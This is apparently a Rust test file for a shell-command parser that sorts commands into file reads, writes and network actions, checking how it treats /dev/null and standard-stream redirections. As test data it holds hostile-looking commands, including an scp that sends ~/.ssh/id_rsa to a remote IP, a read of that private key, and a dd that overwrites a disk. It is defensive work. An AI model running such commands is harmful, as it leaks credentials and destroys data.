//! Redirections to the data sink or the command's own standard streams are no
//! file reads or writes; every other device still is. Also the ordinary
//! redirections and the programs that write.

use super::*;

fn no_fs(atoms: &[AtomicAction]) -> bool {
    !atoms.iter().any(|a| {
        matches!(
            a,
            AtomicAction::FsRead { .. } | AtomicAction::FsWrite { .. }
        )
    })
}

#[test]
fn standard_streams_are_not_files() {
    for cmd in [
        "ls 2>/dev/null",
        "git status >/dev/null 2>&1",
        "npm test &>/dev/null",
        "npm test &>>/dev/null",
        "echo hi >/dev/stdout",
        "echo hi 2>/dev/stderr",
        "echo hi >/dev/fd/1 2>>/dev/fd/2",
        "echo hi >&/dev/null",
        "ls 2>/dev/../dev/null",
        "cargo test </dev/null",
        "cat </dev/stdin",
        "cat </dev/fd/0",
        "cat <>/dev/null",
    ] {
        assert!(no_fs(&parsed(cmd)), "`{cmd}`: {:?}", parsed(cmd));
    }
}

#[test]
fn other_devices_stay_files() {
    assert!(has_write(&parsed("echo x >/dev/tty"), "/dev/tty"));
    assert!(has_write(&parsed("echo x >/dev/fd/3"), "/dev/fd/3"));
    assert!(has_write(&parsed("echo x >/dev/disk0"), "/dev/disk0"));
    assert!(has_write(&parsed("echo x >/dev/stdin"), "/dev/stdin"));
    assert!(has_read(&parsed("cat </dev/stdout"), "/dev/stdout"));
    assert!(has_read(&parsed("cat </dev/fd/3"), "/dev/fd/3"));
    assert!(has_write(&parsed("echo x >/dev/nul?"), "/dev/nul?"));
    // Not a redirection: a copy destination is checked as written.
    assert!(has_write(&parsed("cp x /dev/null"), "/dev/null"));
}

#[test]
fn the_sink_hides_nothing_else() {
    let a = parsed("echo x > ~/.zshrc 2>/dev/null");
    assert!(has_write(&a, "/Users/me/.zshrc"));
    assert!(!has_write(&a, "/dev/null"));
    let a = parsed("cat ~/.ssh/id_rsa 2>/dev/null");
    assert!(has_read(&a, "/Users/me/.ssh/id_rsa"));
}

#[test]
fn redirects_and_write_programs() {
    assert!(has_write(&parsed("echo x > ~/.zshrc"), "/Users/me/.zshrc"));
    assert!(has_write(&parsed("echo x >>~/.zshrc"), "/Users/me/.zshrc"));
    assert!(has_write(&parsed("cmd &> ./out.log"), "/p/out.log"));
    let a = parsed("scp ~/.ssh/id_rsa user@203.0.113.7:/tmp/");
    assert!(has_read(&a, "/Users/me/.ssh/id_rsa"));
    assert!(has_net(&a, "203.0.113.7"));
    let a = parsed("cp ~/.ssh/id_rsa ./key");
    assert!(has_read(&a, "/Users/me/.ssh/id_rsa"));
    assert!(has_write(&a, "/p/key"));
    assert!(has_write(&parsed("rm -rf ./build"), "/p/build"));
    let a = parsed("mv ~/.moat /tmp/old");
    assert!(
        has_write(&a, "/Users/me/.moat"),
        "mv removes its source: {a:?}"
    );
    assert!(has_write(&a, "/tmp/old"));
    assert!(has_read(&parsed("sort < ./in.txt"), "/p/in.txt"));
    assert!(has_write(&parsed("sed -i '' s/a/b/ ./f.txt"), "/p/f.txt"));
    let a = parsed("dd if=/dev/zero of=/dev/disk2");
    assert!(has_write(&a, "/dev/disk2"));
    assert!(
        !parsed("cmd 2>&1")
            .iter()
            .any(|x| matches!(x, AtomicAction::FsWrite { .. }))
    );
}
